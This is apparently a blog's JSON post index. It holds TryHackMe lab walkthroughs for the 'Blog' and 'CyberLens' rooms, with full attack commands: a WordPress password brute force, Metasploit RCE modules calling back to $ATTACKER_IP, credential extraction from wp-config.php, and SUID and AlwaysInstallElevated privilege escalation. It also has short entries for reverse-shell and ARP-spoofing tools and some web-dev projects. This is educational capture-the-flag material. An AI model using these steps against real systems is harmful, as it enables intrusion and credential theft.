[
  
  {
    "title": "Blog",
    "url": "/posts/thm-blog/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, wordpress, linux-privesc, pwncat, wpscan, metasploit",
    "date": "2024-12-28 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Blog, a Medium rated room on TryHackMe. We will explore the exploitation of a vulnerable Wordpress website with wpscan and metasploit, ...",
    "content": "IntroductionHello everyone, today we will be taking a look at Blog, a Medium rated room on TryHackMe. We will explore the exploitation of a vulnerable Wordpress website with wpscan and metasploit, before moving on to the privilege escalation phase using tools like pwncat, LinPEAS and ltrace. Let’s get started !WalkthroughFirst the room asks us to map the blog.thm domain name to the $TARGET_IP in /etc/hosts, so I started by doing that.EnumerationAs always, I like to begin with a port scan. For this I use rustscan. It’s basically a Rust-based port scanner that detects open ports, and then launches an nmap scan only on the discovered ports. You can specify options to the subsequent nmap scan by using the -- NMAP_OPTIONS syntax. I like to go with -sV for identification of services version, and -oN ports to save the result to a file named ports.rustscan -a $TARGET_IP -- -sV -oN ports┌──(kali㉿kali)-[~]└─$ cat portsPORT    STATE SERVICE     REASON  VERSION22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernelWhat do we learn from this scan ?  The target is a Linux system  SSH, HTTP and SMB are runningSMB (139, 445)I always start by enumerating SMB because it’s relatively quick and we often find juicy files. So I started with an smbclient:┌──(kali㉿kali)-[~]└─$ smbclient -L \"//$TARGET_IP\" -U \"%\"\tSharename       Type      Comment\t---------       ----      -------\tprint$          Disk      Printer Drivers\tBillySMB        Disk      Billy's local SMB Share\tIPC$            IPC       IPC Service (blog server (Samba, Ubuntu))When using smbclient, you can specify a username and a password with the following syntax: -U \"username%password\". So -U \"%\" essentially means blank username, blank password.  print$: default share used to store printer drivers and related files  BillySMB:  not a default share !  IPC$: default share used for Inter-Process Communication (IPC),Let’s explore BillySMB:┌──(kali㉿kali)-[~]└─$ smbclient \"//$TARGET_IP/BillySMB\" -U \"%\"`Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Tue May 26 20:17:05 2020  ..                                  D        0  Tue May 26 19:58:23 2020  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020  check-this.png                      N     3082  Tue May 26 20:13:43 2020\t\t15413192 blocks of size 1024. 9788764 blocks availablesmb: \\&gt; mget *Open thunar to get a general overview:SMB filesAlice-White-Rabbit.jpg is a JPG file, so I want to try some steganography tricks with an empty passphrase:┌──(kali㉿kali)-[~]└─$ steghide extract -sf Alice-White-Rabbit.jpgEnter passphrase: wrote extracted data to \"rabbit_hole.txt\"┌──(kali㉿kali)-[~]└─$ cat rabbit_hole.txtYou ve found yourself in a rabbit hole, friend.check-this.png  appears to be a QR code, so let’s scan it using zbarimg:┌──(kali㉿kali)-[~]└─$ zbarimg check-this.png QR-Code:https://qrgo.page.link/M6dEscanned 1 barcode symbols from 1 images in 0 secondsWe could enumerate further, using tools like exiftool and binwalk, tryna look at the .mp4 file and so on, but seems like this SMB server is just a rabbit hole. I also ran enum4linux to double check, but nothing interesting came up. Let’s move on.HTTP (80)You can learn more about WordPress enumeration in here.Seems like WordPress is runningManual EnumAs you can see on the index page, the post has been written by Karen WheelerThere is a little trick that you can use to enumerate other users. Simply add ?author=X where X is a number at the end of the URL:I tried it with X=2 but it returned a 404 Not Found, so there are only two users on this WordPress website.Let’s try to login manually. Note that we cannot login with Karen Wheeler or Billy Joel as username, we need to login with their wordpress generated usernames, the first letter of the firstname and the lastname:        WPScanHere is the WPScan with irrelevant parts removed:┌──(kali㉿kali)-[~]└─$ wpscan --url http://$TARGET_IP[+] robots.txt found: http://10.10.132.87/robots.txt | Interesting Entries: |  - /wp-admin/ |  - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://10.10.132.87/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Emoji Settings (Passive Detection) |  - http://10.10.132.87/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.0' | Confirmed By: Meta Generator (Passive Detection) |  - http://10.10.132.87/, Match: 'WordPress 5.0'[i] No plugins Found.I checked the /wp-content/uploads/ folder since it has directory listing enabled, but found nothing interesting there. Version is 5.0 which is quite old, so let’s search for potential exploits.SearchsploitWordpress 5.0 is an old version (the latest version is 6.7), so running searchsploit against this version might be a good ideaSearchsploit found a lot of exploits that match this WP versionThere are a ton of exploits, but only 5 of them affect WordPress itself and only 4 are of interest (the fifth is a DoS exploit).The others exploits target WP plugins, but we know from the wpscan that there are no plugins installed here. So we only need to test 4 exploits.The relevant exploitsWe have gathered enough information from the enumeration phase. Let’s move on to the exploitation part.ExploitationSearchsploit exploitsI tried the 4 exploits; the python one (php/webapps/49512.py) was an authenticated exploit, the JS one (php/webapps/46511.js) was also authenticated, the metasploit module (php/remote/46662.rb) also authenticated and the Markdown (multiple/webapps/47690.md) was an enumeration trick that didn’t work.BruteforcingSince we don’t have credentials, let’s try a dictionary attack with wpscan. First we will create the user wordlist, then launch the attack:┌──(kali㉿kali)-[~]└─$ echo -e \"bjoel\\nkwheel\" &gt; real_users.txt┌──(kali㉿kali)-[~]└─$ wpscan --url http://$TARGET_IP/ -U real_users.txt -P $PASSWORD_WORDLISTI started by trying the 2020-200_most_used_passwords.txt and the 2023-200_most_used_passwords.txt wordlists from SecLists but nothing came up. So I decied to be patient, and used the rockyou.txt wordlist. After a few minutes I got this:[+] Performing password attack on Xmlrpc against 2 user/s[SUCCESS] - kwheel / cutiepie1^C[!] Valid Combinations Found: | Username: kwheel, Password: cutiepie1 Getting RCEWe finally have our needed credentials: kwheel:cutiepie1. Let’s use the metasploit authenticated exploit that we found during the Searchsploit part.┌──(kali㉿kali)-[~]└─$ msfconsolemsf6 &gt; use exploit/multi/http/wp_crop_rceAfter typing show options, we realize that a few options need to be configured:msf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set USERNAME kwheelmsf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set PASSWORD cutiepie1msf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set RHOSTS $TARGET_IPmsf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set LHOST $ATTACKER_IPWithin a few seconds, we’re greeted with a meterpreter session.Time to privesc !PrivescPwncatThe meterpreter is cool but I prefer to use pwncat. So I setup the pwncat reverse listener in another terminal, and run a reverse shell from the meterpreter session like this:From meterpreter to pwncatUser flag … or notI tried to cat the user flag, but I got trolled:(remote) www-data@blog:/var/www/wordpress$ cat /home/bjoel/user.txtYou won't find what you're lookif for here.TRY HARDERLooking into the bjoel home directory, I came across a PDF. Downloaded it using pwncat and opened it:Joel was working for Rubber DuckyThis might be a clue, perhaps the flag is in /media/ or something:Not a big deal, we’ll search for the user flag once we have root access.Manual enumerationLet’s start by enumerating the users that have a connection shell(remote) www-data@blog:/var/www/wordpress$ cat /etc/passwd | grep bashroot:x:0:0:root:/root:/bin/bashbjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bashNext, let’s grab the content of the wp-config.php file. This file contains information required by WordPress to connect to the database such as:  db name  db host  db username  db password(remote) www-data@blog:/var/www/wordpress$ cat wp-config.php | grep DB_define('DB_NAME', 'blog');define('DB_USER', 'wordpressuser');define('DB_PASSWORD', 'LittleYellowLamp90!@');Tried using the database password to su bjoel and su root, but unfortunately it didn’t work. Next, I extracted the password for the bjoel WordPress user from the MySQL database and I attempted to crack it with john, but … my CPU ain’t powerful enough. Time for automated enumeration I guess.LinpeasNote: with pwncat, you can switch between the attacker’s shell and the victim’s shell by pressing Ctrl + D.Look at the last lineIt looks like there is an unknown SUID binary ! SUID (Set User ID) is a special permission with one key function: the binary executes as the user who owns the file. This means that if the binary is owned by root, it will execute with root privileges, even if launched by the www-data user. Therefore, it’s a significant privesc vector. More on that in here.SUID binaryWhen we run the binary, it says “Not an Admin”. Let’s download it locally and try to ltrace it to examine dynamic libraries and syscall done by the binary:Downloading it with the help of pwncatAnalyzing it with ltraceFrom the ltrace output, we see that the binary checks the admin variable from the environment with the getenv() function. So we can just modify the admin env variable and set it to true. Once we do that we can grab our flags !Rooted !We use the find command to search for the real user.txt flag, which was indeed located in the /media/usb/, just as we suspected ."
  },
  
  {
    "title": "CyberLens",
    "url": "/posts/thm-cyberlens/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, windows, windows-privesc, metasploit",
    "date": "2024-12-26 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Cyberlens, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Windows server, before moving on to the pr...",
    "content": "IntroductionHello everyone, today we will be taking a look at Cyberlens, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Windows server, before moving on to the privilege escalation phase using the Metasploit framework. Let’s get started !WalkthroughEnumerationAs always, we begin with a basic rustscan port scan, followed by an nmap scan with identification of services version, and we output the result to a file named all_ports.rustscan -a $TARGET_IP -- -sV -oN all_ports┌──(kali㉿kali)-[~]└─$ cat all_portsPORT        STATE SERVICE       REASON  VERSION80/tcp      open  http          syn-ack Apache httpd 2.4.57 ((Win64))135/tcp     open  msrpc         syn-ack Microsoft Windows RPC139/tcp     open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn445/tcp     open  microsoft-ds? syn-ack 3389/tcp    open  mw-wbt-server syn-ack Microsoft Terminal Services5985/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)7680/tcp    open  panda-pub?    syn-ack 47001/tcp   open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)--------- lot of MSRPC opened ports, not of interest 61777/tcp   open  http          syn-ack Jetty 8.y.z-SNAPSHOTService Info: OS: Windows; CPE: cpe:/o:microsoft:windows We learn a few essential things from this scan:  The target is running Windows Server  There are 4 HTTP servers, as well as SMB and RDP runningSMB (139, 445)I like to start by enumerating SMB because it’s relatively quick, and we always find juicy files. So I ran:┌──(kali㉿kali)-[~]└─$ smbclient -L \"//$TARGET_IP/\"Password for [WORKGROUP\\kali]:session setup failed: NT_STATUS_ACCESS_DENIEDUnfortunately, nothing interesting came up.HTTP (80)The main functionality of this server is to provide image metadata extraction. However, pressing Ctrl + U revealed no form in the HTML source code:&lt;div class=\"detail-box\"&gt;    &lt;div class=\"heading_container\"&gt;            &lt;h2&gt;CyberLens Image Extractor&lt;/h2&gt;        &lt;/div&gt;        &lt;p&gt; &lt;!-- Uninteresting text ... --&gt; &lt;/p&gt;        &lt;input type=\"file\" id=\"imageFileInput\"&gt;        &lt;button id=\"metadataButton\"&gt;Get Metadata&lt;/button&gt;    &lt;div id=\"metadataOutput\"&gt;&lt;/div&gt;&lt;/div&gt;That means that the metadata extraction functionality is probably handled by JavaScript. Scrolling further in the HTML source code, I found the following JavaScript code, where I removed irrelevant part:document.getElementById(\"metadataButton\").addEventListener(\"click\", function() {    var fileInput = document.getElementById(\"imageFileInput\");    var reader = new FileReader();    var fileData = reader.result;    fetch(\"http://cyberlens.thm:61777/meta\", {        method: \"PUT\",        body: fileData,        headers: {            \"Accept\": \"application/json\",            \"Content-Type\": \"application/octet-stream\"        }    })}As you can see, the JavaScript sends the file we uploaded on port 61777. This indicates that the service responsible for the metadata handling is indeed running on port 61777.HTTP (61777)This seems to be a version disclosureLet’s take advantage of this significant version disclosure by running searchsploit on this Tika version:Searchsploit found a Metasploit module that matches the Tika versionExploitationLet’s start by launching Metasploit and searching for the Tika exploit we identified in the enumeration part.Metasploit exploit module for Tika 1.17After typing show options, we realize that a few options need to be configured:msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set RHOSTS $TARGET_IPRHOSTS =&gt; $TARGET_IPmsf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set RPORT 61777RPORT =&gt; 61777msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set LHOST $ATTACKER_IPLHOST =&gt; $ATTACKER_IPmsf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; run[*] Started reverse TCP handler on $ATTACKER_IP:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[+] The target is vulnerable.Within a few seconds, we’re greeted with a meterpreter session. Now, all that’s left is to grab the user flag!And we get our first flag !PrivescSince we are already in Metasploit, let’s use the integrated post/multi/recon/local_exploit_suggester. To do this, let’s start by backgrounding the meterpreter session by pressing Ctrl + Z, then let’s run the following commands:msf6 &gt; use multi/recon/local_exploit_suggestermsf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1msf6 post(multi/recon/local_exploit_suggester) &gt; runThis is essentially a post-exploitation module that automatically tries different methods to identify a way to escalate our privileges. You can read more about it here.Metasploit’s local_exploit_suggester in actionThe scan reveals several vulnerabilities, but only one is explicitly marked as “vulnerable” (and not simply as “appears to be vulnerable”). You can learn more about the “Always Install Elevated” feature on the Microsoft official doc and read this ressource for an Attacker perspective.  Users with limited privileges can exploit this feature by creating a Windows Installer installation package (MSI) that      Creates a new local account in the local Administrators group    Adds their current account to the local Administrators group    Installs malicious software    Performs other unauthorized activities  – SourceLet’s give it a try !msf6 &gt; use exploit/windows/local/always_install_elevated [*] No payload configured, defaulting to windows/meterpreter/reverse_tcpAfter typing show options, we notice that some parameters need to be configured.msf6 exploit(windows/local/always_install_elevated) &gt; set SESSION 1msf6 exploit(windows/local/always_install_elevated) &gt; set LHOST $ATTACKER_IPmsf6 exploit(windows/local/always_install_elevated) &gt; set LPORT 9999msf6 exploit(windows/local/always_install_elevated) &gt; runAnd we rooted the room"
  },
  
  {
    "title": "wpsh",
    "url": "/posts/wpsh/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2024-12-25 16:00:00 +0000",
    





    
    "snippet": "🚀 UsageThis script allows you to exploit a WordPress instance to obtain a reverse shell by editing the 404.php theme page. It requires the username and password of a valid WordPress administrator. ...",
    "content": "🚀 UsageThis script allows you to exploit a WordPress instance to obtain a reverse shell by editing the 404.php theme page. It requires the username and password of a valid WordPress administrator. Once authenticated, the script establishes a reverse shell, granting access to the remote instance.wpsh help menuSourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "arpspoofer",
    "url": "/posts/arpspoofer/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2024-11-28 16:00:00 +0000",
    





    
    "snippet": "🚀 UsageThis tool allows you to perform an ARP cache poisoning attacks between two targets (a victim and a gateway) on a local network. It manipulates the ARP tables of the victims to redirect netwo...",
    "content": "🚀 UsageThis tool allows you to perform an ARP cache poisoning attacks between two targets (a victim and a gateway) on a local network. It manipulates the ARP tables of the victims to redirect network traffic through the attacker, enabling interception or modification of data.  In the help menu, you can see -g GATEWAY and -t TARGET. However, if you want to capture traffic between two victims without one of them being the gateway, you can still use this tool with -g TARGET1 and -t TARGET2.arpspoofer help menuSourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "Todo.js",
    "url": "/posts/todojs/",
    "categories": "Web Dev, React",
    "tags": "",
    "date": "2024-07-04 16:00:00 +0000",
    





    
    "snippet": "General overviewTo gain more experience with React and the localStorage API, I developed a dynamic to-do app with various features such as a search bar, a checkbox to hide completed tasks, and more...",
    "content": "General overviewTo gain more experience with React and the localStorage API, I developed a dynamic to-do app with various features such as a search bar, a checkbox to hide completed tasks, and more. Tasks are stored in localStorage, ensuring that all modifications are persisted. Finally, the frontend is built using Tailwind.          SourceThe source code and installation instructions are accessible here.You can also test it directly in here."
  },
  
  {
    "title": "FTPy",
    "url": "/posts/ftpy/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2023-05-11 16:00:00 +0000",
    





    
    "snippet": "This project is basically a simplified FTP client, which, through an established socket, allows connecting and performing FTP exchanges, such as sending, retrieving, or deleting a file.OverviewComm...",
    "content": "This project is basically a simplified FTP client, which, through an established socket, allows connecting and performing FTP exchanges, such as sending, retrieving, or deleting a file.OverviewCommandsAuth  USER  PASSInteraction with files  PASV  LIST (ls)  RETR (get)  STOR (put)Interaction with filesystem  CD (cd)  PWD (pwd)  MKD (mkdir)  DELE (rm)  CHMOD (chmod)SourceThe source code and installation instructions are accessible here"
  },
  
  {
    "title": "Laravel Cybershop",
    "url": "/posts/laravel-ecommerce/",
    "categories": "Web Dev, Laravel",
    "tags": "",
    "date": "2023-04-23 16:00:00 +0000",
    





    
    "snippet": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, s...",
    "content": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, some library like HTMX and Swiper, and Bootstrap for the front end part. I also used the Pusher websocket to create real-time notifications.General overviewThe products are sorted by categories. Each category has its own search bar, and there is a general search bar that searches across all categories. On the product display pages, you can see the products, their names, categories, prices, and average rating.          LoginYou can create an account with whatever email address you want, but you’ll need to validate it by clicking on the link sent by email. You can reset your password using the same email address.          As you can see, livewire is used for the dynamic validation here.ProductYou can sell a product by adding it in the “market” section. Give it a name, a price, a category, and a main image. You can also add secondary images. Finally, a MD-like editor is available for the product description (bold, italic, list, strikethrough text, links and so on).The drag &amp; drop functionnality is done with filepond.js.          CommentsYou can leave a comment on any product by adding a title, a rating, and your comment. Again, a markdown-like editor is available to help you style your text. Finally, you can “heart” other people’s comments.          SettingsYou can customize your profile by changing your profile picture, email, or password. There is also a profile page displaying the products you are selling, the number of hearts your comments have received, your average product rating, the number of comments you have made, and a list of your recent comments.          PaymentWhen you add a product to your cart, it appears in the small dynamic cart icon in the navbar. Clicking on this cart icon takes you to a more detailed page where you also have the option to buy by making the payment (we have chosen to use Stripe).          I chose Livewire for the dynamic cart page.ChatboxThere is a chat that allows you to interact with sellers or other clients. It is dynamic and supports sending messages as well as images. Additionally, the notification component in the navbar uses WebSockets, making it real-time. Therefore, you will receive notifications instantly as they happen.          The dynamic notification component is updated using livewire + pusher.js websocket.SourceThe source code and installation instructions are accessible here.You’ll also find a docker-compose file there if you want to test the application locally."
  },
  
  {
    "title": "PHP Chat",
    "url": "/posts/php-webchat/",
    "categories": "Web Dev, PHP",
    "tags": "",
    "date": "2023-02-16 16:00:00 +0000",
    





    
    "snippet": "In order to gain experience with API development and some concepts like interactivity, designing a responsive UI, and so on, i made a PHP chat with a backend based on a PHP API to manage authentica...",
    "content": "In order to gain experience with API development and some concepts like interactivity, designing a responsive UI, and so on, i made a PHP chat with a backend based on a PHP API to manage authentication and messages, coupled with a MariaDB database.On the other hand, the front-end is entirely handled by JavaScript with AJAX requests, and by Bootstrap + Vanilla CSS for the CSS part.Login          As you may noticed, the validation is done with AJAX, so it’s dynamic.Chat          The &lt;form&gt; is directly posted to the API. However, the update and delete fonctionnalities are done in JavaScript with AJAX requests.Settings page          The validation of the entered password is also done with AJAX requests.SourceThe source code and installation instructions are accessible hereYou’ll also find a docker-compose file there if you want to test the application locally."
  }
  
]

